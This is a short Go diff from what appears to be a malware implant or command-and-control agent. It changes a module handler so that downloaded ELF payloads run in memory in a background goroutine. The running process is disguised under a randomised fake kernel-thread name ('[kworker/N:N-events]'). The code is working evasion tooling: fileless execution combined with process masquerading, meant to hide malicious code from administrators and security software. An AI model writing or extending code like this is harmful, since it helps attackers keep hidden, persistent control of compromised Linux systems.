@@ -85,12 +85,15 @@ func moduleHandler(download_addr, file_to_download, payload_type, modName, check
 		}
 	case "elf":
 		if inMem {
-			out = "Successfully executed ELF binary in memory"
-			err = exe_utils.InMemExeRun(payload_data, []string{"[kworker:0]"}, env)
-			if err != nil {
-				out = fmt.Sprintf("running ELF binary in memory: %v", err)
-			}
-			return out
+			go func() {
+				randName := fmt.Sprintf("[kworker/%d:%d-events]", util.RandInt(0, 20), util.RandInt(0, 10))
+				// if you need to pass arguments to the in-memory module, you can do it in environment variables
+				// when implementing the module, you can read the arguments from env
+				err = exe_utils.InMemExeRun(payload_data, []string{randName}, env)
+				if err != nil {
+					log.Printf("InMemExeRun: %v", err)
+				}
+			}()
 		}
 	default:
 		// on disk modules
